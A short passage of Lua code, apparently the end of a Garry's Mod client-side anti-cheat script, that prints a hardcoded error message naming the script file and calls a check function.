		ErrorNoHalt("[ERROR] lua/autorun/client/hex_ac.lua:223: attempt to index global 'string' (a nil value)")
	end
end
NotTS(1, CheckBBUF)]]--